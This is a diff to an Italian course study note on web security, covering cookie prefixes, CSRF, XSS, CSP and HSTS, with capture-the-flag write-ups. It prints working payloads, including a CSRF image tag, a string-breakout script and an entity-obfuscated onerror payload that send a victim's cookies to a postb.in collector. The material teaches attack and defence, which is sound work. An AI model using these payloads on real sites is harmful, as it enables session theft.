@@ -1,3 +1,5 @@
+[[4 - CS Applitcation Level - Sintesi Web Security Part I|previous lesson]]
+Sintesi [[5 - CS Applitcation Level - Sintesi Web Security Part II|qui]]
 # Web Security: Part II
 
 **Tags:** #ingegneria #sicurezza_informatica #web_security #browser_security #SOP
@@ -404,7 +406,7 @@ Può essere usato per violare una rete privata, inducendo il browser della vitti
 
 ## 1. JSON with Padding (JSON-P)\
 
-**JSON with Padding (JSON-P)** è essenzialmente un "trucco" (o _hack_, come definito nelle slide) inventato dagli sviluppatori per aggirare la **Same Origin Policy (SOP)** prima che esistesse uno standard ufficiale come CORS.
+**JSON with Padding ([[JSON-P]])** è essenzialmente un "trucco" (o _hack_, come definito nelle slide) inventato dagli sviluppatori per aggirare la **Same Origin Policy (SOP)** prima che esistesse uno standard ufficiale come [[CORS]].
 
 Il termine "Padding" (riempimento) confonde spesso: non si tratta di spazi vuoti, ma del fatto che i dati JSON vengono "avvolti" (padded) dentro una chiamata a funzione JavaScript.
 
@@ -1187,6 +1189,39 @@ Per mitigare le ambiguità, sono stati proposti i prefissi dei cookie, che forni
             
     - Garantisce integrità rispetto ad attaccanti su domini correlati (related-domain attackers).
 
+**Gli attaccanti non possono creare arbitrariamente questi cookie**.
+
+Il motivo risiede nel fatto che il controllo di sicurezza non viene fatto dal server, ma dal **browser**. Ecco come funziona il meccanismo e perché protegge anche se il server è "cieco":
+
+### 1. Il Browser come "Guardiano" (Enforcement Lato Client)
+
+Le fonti specificano chiaramente che se un cookie ha un prefisso, "viene accettato dal **browser** solo se...". Questo significa che il browser applica regole rigide nel momento in cui un sito prova a **impostare** (`Set-Cookie`) il cookie.
+
+Se un attaccante prova a creare un cookie malformato con quei prefissi, il browser **rifiuta di salvarlo**. Non entra mai nel "Cookie Jar" (il contenitore dei cookie), quindi non verrà mai inviato al server.
+
+### 2. Perché l'attacco fallisce (Scenari Pratici)
+
+Analizziamo i due casi in base alle tue fonti:
+
+- **Caso `__Secure-` (Contro Attaccanti di Rete/Man-in-the-Middle):**
+    
+    - _L'attacco:_ Un attaccante sulla rete intercetta una connessione HTTP (non cifrata) e prova a iniettare: `Set-Cookie: __Secure-Session=falso; Path=/`
+    - _La Difesa:_ Il browser vede il prefisso `__Secure-`. Controlla se è presente l'attributo `Secure`. Poiché la connessione è HTTP (o l'attributo manca), il browser dice: "Violazione delle regole del prefisso" e **scarta il cookie**.
+    - _Risultato:_ Il server non riceverà mai questo cookie falso.
+- **Caso `__Host-` (Contro Attaccanti da Sottodomini/Cookie Tossing):**
+    
+    - _L'attacco:_ Un attaccante controlla il sottodominio `evil.example.com`. Vuole sovrascrivere il cookie di sessione del sito principale `example.com`. Invia: `Set-Cookie: __Host-Session=falso; Domain=example.com; Secure; Path=/`
+    - _La Difesa:_ Il browser vede il prefisso `__Host-`. Le regole dicono che questo cookie **NON deve avere l'attributo Domain** (deve essere _host-only_).
+    - _Risultato:_ Poiché l'attaccante ha dovuto usare `Domain=example.com` per cercare di colpire il sito padre (vedi Cookie Tossing), il browser rileva la violazione e **rifiuta il cookie**.
+
+### 3. La Garanzia per il Server
+
+È vero che il server non può verificare gli attributi quando riceve il cookie. Ma, grazie a questo meccanismo, il server può fare questo ragionamento deduttivo:
+
+> _"Vedo un cookie che si chiama `__Host-Session`. So che i browser moderni avrebbero **rifiutato di salvarlo** se non fosse stato impostato in modo sicuro (Secure, HTTPS) e proveniente esattamente dal mio host (senza attributo Domain). Quindi, posso fidarmi che sia legittimo."_
+
+In sintesi: il server si fida del **nome** del cookie perché sa che il **browser** ha già bloccato qualsiasi tentativo di creazione illegittima di quel nome specifico.
+
 # Web Security: Training Challenge & Recap
 
 **Tags:** #ingegneria #sicurezza_informatica #web_security #cookies #training #CTF
@@ -1393,9 +1428,7 @@ Le richieste cross-site possono far trapelare il contenuto di un cookie quando l
 
 ## 1. Cross Site Request Forgery (CSRF)
 
-L'attacco **CSRF** (Cross Site Request Forgery) sfrutta l'inclusione automatica dei cookie alle richieste effettuate dai browser per eseguire azioni arbitrarie all'interno della sessione stabilita dalla vittima con il sito web target.
-
-![[Pasted image 20260131135952.png]]![[Pasted image 20260131140040.png]]![[Pasted image 20260131140051.png]]
+L'attacco **[[CSRF]]** (Cross Site Request Forgery) sfrutta l'inclusione automatica dei cookie alle richieste effettuate dai browser per eseguire azioni arbitrarie all'interno della sessione stabilita dalla vittima con il sito web target.
 
 > [!abstract] Visual Analysis
 > 
@@ -1435,6 +1468,8 @@ Le slide mostrano un esempio pratico di attacco contro `bank.com`.
 
 L'utente Alice effettua il login legittimo.
 
+![[Pasted image 20260131135952.png]]
+
 **Here is the exact implementation shown in the slides:**
 
 ```http
@@ -1450,12 +1485,15 @@ Set-Cookie: session=XYZ; Secure; HttpOnly
 
 L'attaccante usa un tag `<img>` per scatenare una richiesta GET verso l'endpoint di trasferimento denaro.
 
+![[Pasted image 20260131140040.png]]
+![[Pasted image 20260131140051.png]]
+
 **Here is the exact implementation shown in the slides:**
 
 ```html
 <HTML>
 <BODY>
-<IMG src="https://bank.com/?act=attacker&amt=3000">
+	<IMG src="https://bank.com/?act=attacker&amt=3000">
 </BODY>
 </HTML>
 ```
@@ -1521,6 +1559,47 @@ Set-Cookie: _Host-CSRF_token=aen4GjH9b3s; Path=/; Secure
 > [!abstract] Nota
 > 
 > La maggior parte dei moderni framework web utilizza token anti-CSRF per impostazione predefinita.
+
+### Ma non abbiamo detto che esiste già i flag SameSite=Lax per proteggerci dal CSRF?
+
+Hai fatto un'osservazione eccellente. È vero, l'introduzione di `SameSite=Lax` come default ha cambiato radicalmente il panorama della sicurezza web, ma **non ha reso obsoleti i Token Anti-CSRF**.
+
+La risposta breve è: **`SameSite` protegge contro gli attaccanti esterni ("Classic Web Attackers"), ma i Token servono per proteggersi contro gli attaccanti interni ("Related-Domain Attackers") e per la difesa in profondità.**
+
+Ecco il dettaglio basato sulle fonti per chiarire questa distinzione cruciale.
+
+#### 1. Il Ruolo di `SameSite=Lax` (La prima linea di difesa)
+
+Come hai notato correttamente, e come confermano le slide, da Febbraio 2020 i browser moderni impostano di default i cookie su `SameSite=Lax`.
+
+- Questo blocca efficacemente il CSRF classico proveniente da siti esterni (es. `evil.com` che attacca `bank.com`), perché il browser si rifiuta di allegare il cookie nelle richieste "cross-site" generate da immagini, iframe o form automatici.
+
+#### 2. Perché i Token servono ancora? (Il buco nella difesa)
+
+Le slide evidenziano un limite critico dell'attributo `SameSite` che rende necessari i token: **i "Related-Domain Attackers"**.
+
+L'attributo `SameSite` non distingue tra origini diverse se condividono lo stesso **dominio registrabile** (eTLD+1).
+
+- **Lo Scenario:** Immagina che la tua università abbia il dominio `uni.it`.
+    - Il portale voti è su `voti.uni.it`.
+    - Un portale gestito dagli studenti (o un sottodominio compromesso/vulnerabile a XSS) è su `studenti.uni.it`.
+- **Il Fallimento di SameSite:** Se `studenti.uni.it` lancia un attacco CSRF verso `voti.uni.it`, il browser considera questa richiesta come **Same-Site** (stesso "cognome" `uni.it`). Di conseguenza, il cookie `Lax` **viene inviato** e l'attacco ha successo.
+- **La Soluzione (Token):** I Token Anti-CSRF (come il _Synchronizer token pattern_) sono specifici per l'applicazione e non dipendono dal dominio DNS. Anche se il cookie passa, il form malevolo inviato da `studenti.uni.it` fallirà perché l'attaccante non conosce il token segreto nascosto nel form HTML di `voti.uni.it`.
+
+#### 3. Conferma sulla tua Flashcard (Token Anti-CSRF)
+
+La tua descrizione dei token è **corretta e perfettamente allineata alle slide**. Ecco un riscontro puntuale sui dettagli che hai scritto:
+
+- **Synchronizer token pattern:** Corretto. Le slide confermano che è una stringa segreta incorporata come `<INPUT type="hidden" ...>` e verificata all'invio.
+- **Cookie-to-header token:** Corretto. Le slide mostrano l'implementazione in cui JavaScript legge un cookie e lo copia in un header HTTP personalizzato (es. `X-CSRF-Token`). Questo funziona perché la SOP impedisce a un sito attaccante di leggere il cookie della vittima o di impostare header personalizzati nelle richieste cross-origin semplici.
+- **Vincolo alla sessione:** Corretto. È fondamentale che il token sia legato alla sessione dell'utente (cryptographically bound), altrimenti un attaccante potrebbe usare un _proprio_ token valido per forgiare una richiesta valida per la vittima.
+
+#### Sintesi per l'Esame
+
+Non scegliere tra l'uno o l'altro. La sicurezza moderna usa la **Defense in Depth** (difesa in profondità):
+
+1. **`SameSite=Lax`:** Protegge di default contro la maggior parte degli attacchi provenienti da domini esterni.
+2. **Anti-CSRF Tokens:** Proteggono contro attacchi provenienti da sottodomini compromessi (related-domain) e offrono una garanzia esplicita che l'intenzione dell'utente fosse legittima.
 
 ---
 
@@ -1741,13 +1820,7 @@ Nel Reflected XSS, il sito web include i dati della richiesta HTTP in ingresso n
 2. `evil.com` risponde con un reindirizzamento (`302 FOUND`) verso il sito vulnerabile `example.com`, includendo il payload nel parametro `q`.
     
 
-#### Sezione Implementazione
-
-**Here is the exact implementation shown in the slides:**
-
-HTTP
-
-```
+```HTTP
 302 FOUND
 Location:
 https://example.com/?q=<SCRIPT>alert(1)</SCRIPT>
@@ -1837,6 +1910,7 @@ Poiché il messaggio viene renderizzato dall'admin, esiste la possibilità di es
     
 
 ### Soluzione: Encoding
+![[Pasted image 20260205183539.png]]![[Pasted image 20260205183545.png]]![[Pasted image 20260205183550.png]]![[Pasted image 20260205183557.png]]
 
 Per aggirare il filtro, è necessario codificare il payload in modo inaspettato per il filtro ma comprensibile per il browser.
 
@@ -1889,6 +1963,33 @@ print("\">")
     
 4. Nel `postb.in` compare una richiesta GET contenente il cookie: `flag=WIT{...}`.
 ![[Pasted image 20260131141446.png]]
+
+### 1. Come viene usato l'output
+
+L'output generato dallo script `exploit.py` è una stringa HTML specificamente formattata per aggirare i filtri della chat.
+
+1. **Generazione del Payload:** Lo script prende il codice JavaScript malevolo (il redirect verso `postb.in` con i cookie) e lo converte in una sequenza di **entità HTML decimali con padding** (es. `&#0000106` invece di `j`). Questo viene inserito all'interno dell'attributo `onerror` di un tag immagine non valido.
+    - _Output tipico:_ `<img src=x onerror="&#0000106&#0000097...">`
+2. **Immissione (Injection):** L'attaccante copia questa stringa e la incolla come messaggio nella chat dell'applicazione vulnerabile.
+3. **Memorizzazione:** Poiché si tratta di una **Stored XSS**, il messaggio viene salvato dal server e visualizzato successivamente dalla vittima (l'Admin) quando apre la chat per leggere i messaggi.
+
+### 2. Come riesce a "fregare" i cookie (Il meccanismo tecnico)
+
+L'attacco ha successo perché sfrutta il modo in cui i browser gestiscono gli attributi HTML e gli eventi, aggirando al contempo un filtro di sicurezza mal implementato.
+
+Ecco la sequenza esatta:
+
+- **Evasione del Filtro:** L'applicazione chat implementa un filtro che blocca il codice JavaScript palese (probabilmente cerca parole chiave come `<script>` o `javascript:` in chiaro). Tuttavia, il filtro non decodifica le entità HTML prima di analizzare il testo. Poiché il codice è offuscato come `&#0000106...`, il filtro lo lascia passare, credendo sia testo innocuo.
+- **Rendering e Trigger dell'Evento:** Quando il browser dell'Admin visualizza il messaggio:
+    1. Tenta di caricare l'immagine definita in `<img src=x ...>`.
+    2. Poiché `x` non è un URL valido, il caricamento fallisce.
+    3. Il fallimento attiva immediatamente l'evento **`onerror`**.
+- **Decodifica ed Esecuzione:** Qui avviene il passaggio critico. Per standard, quando un browser legge il valore di un attributo HTML (come `onerror`), **decodifica automaticamente le entità HTML** prima di passare il contenuto al motore JavaScript.
+    - Il browser trasforma `&#0000106...` nella stringa originale: `javascript:document.location='https://postb.in/...'`.
+    - Il codice JavaScript viene quindi eseguito nel contesto della sessione dell'Admin.
+- **Esfiltrazione:** Il comando eseguito reindirizza il browser dell'Admin verso il server dell'attaccante (`postb.in`), appendendo i **cookie di sessione** dell'Admin come parametro dell'URL (`?cookie=...`).
+
+L'attaccante deve solo controllare i log del suo `postb.in` per vedere la richiesta in arrivo contenente il cookie segreto dell'Admin.
 
 ---
 
@@ -1951,15 +2052,9 @@ Questa challenge simula un servizio di "Pastebin" personalizzato.
 
 ### Analisi del Codice e Vulnerabilità
 
-Analizzando il codice sorgente della pagina dove viene visualizzato il paste, si nota come viene gestita la sanitizzazione.
+Analizzando il codice sorgente della pagina dove viene visualizzato il paste, si nota come viene gestita la sanitizzazione:
 
-#### Sezione Implementazione
-
-**Here is the exact implementation shown in the slides:**
-
-JavaScript
-
-```
+```JavaScript
 <script>
 const note = "asaas";
 const note_id = "3b7b2f42-36e4-4298-975e-5127d9565fc3";
@@ -1987,9 +2082,7 @@ Poiché l'input è dentro una stringa delimitata da doppi apici, possiamo "rompe
 
 #### Payload di Test
 
-JavaScript
-
-```
+```JavaScript
 "; alert(1); //
 ```
 
@@ -2004,9 +2097,7 @@ JavaScript
 
 Per rubare i cookie e inviarli al nostro server (es. `postb.in`):
 
-JavaScript
-
-```
+```JavaScript
 "; window.location = 'https://postb.in/YOUR_BIN_ID?' + document.cookie; //
 ```
 
@@ -2027,9 +2118,7 @@ L'attacco richiede di far visualizzare il paste malevolo alla vittima (TJMike). 
 
 **Here is the exact implementation shown in the slides:**
 
-HTTP
-
-```
+```HTTP
 POST /report/ee31731c-bfd7-4089-b4de-4548d15cf799 HTTP/2
 Host: training08.webhack.it
 Cookie: challenge_auth_token=...
@@ -2350,13 +2439,13 @@ Esistono risorse online ("Cheat sheets") che elencano vettori per aggirare WAF (
 
 ## 1. Content Security Policy (CSP)
 
-La **Content Security Policy (CSP)** è una politica progettata per controllare quali risorse possono essere caricate da una pagina web.
+La **Content Security Policy ([[CSP]])** è una politica progettata per controllare quali risorse possono essere caricate da una pagina web.
 
-- Originariamente sviluppata per mitigare vulnerabilità di iniezione di contenuti come **XSS**.
+- Originariamente sviluppata per mitigare vulnerabilità di iniezione di contenuti come **[[XSS]]**.
     
 - Attualmente utilizzata per molteplici scopi:
     
-    - Restringere le capacità di framing.
+    - Restringere le capacità di [[Framing]].
         
     - Bloccare contenuti misti (mixed contents).
         
@@ -2925,7 +3014,7 @@ Sono stati identificati oltre 60 "injection sinks" differenti. Esistono 3 possib
 
 ---
 
-## 3. Network Protocol Issues: SSL Stripping
+## 3. Network Protocol Issues: [[SSL Stripping]]
 
 Questa sezione analizza i rischi nel passaggio da HTTP a HTTPS.
 
@@ -2965,7 +3054,7 @@ In questo intervallo, un attaccante può eseguire un attacco di **SSL Stripping*
 
 ## 4. HTTP Strict Transport Security (HSTS)
 
-HSTS è una contromisura che permette a un server di dichiarare che tutte le interazioni future devono avvenire **esclusivamente** su HTTPS.
+[[HSTS]] è una contromisura che permette a un server di dichiarare che tutte le interazioni future devono avvenire **esclusivamente** su HTTPS.
 
 ### Funzionamento
 
@@ -2995,9 +3084,7 @@ Una policy HSTS è definita dai seguenti parametri nell'header:
 
 **Here is the exact implementation shown in the slides:**
 
-HTTP
-
-```
+```HTTP
 max-age=6307200; includeSubDomains; preload
 ```
 
@@ -3012,7 +3099,7 @@ max-age=6307200; includeSubDomains; preload
 
 ---
 
-## 5. Bypassare HSTS con NTP
+## 5. Bypassare HSTS con [[NTP]]
 
 È possibile aggirare la protezione HSTS manipolando l'orologio di sistema tramite il protocollo NTP (Network Time Protocol).
 
